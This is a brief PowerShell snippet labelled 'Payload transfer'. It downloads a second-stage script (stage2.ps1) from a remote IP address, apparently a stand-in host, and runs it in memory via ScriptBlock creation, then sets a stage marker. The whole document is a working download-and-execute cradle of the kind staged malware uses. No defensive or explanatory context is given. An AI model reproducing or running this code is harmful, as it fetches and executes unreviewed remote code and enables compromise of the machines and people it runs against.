# Payload transfer
$TransferUrl = 'https://192.0.2.237/stage2.ps1'
$RemoteScript = (New-Object Net.WebClient).DownloadString($TransferUrl)
& ([ScriptBlock]::Create($RemoteScript))
$StageMarker = "stage-7"
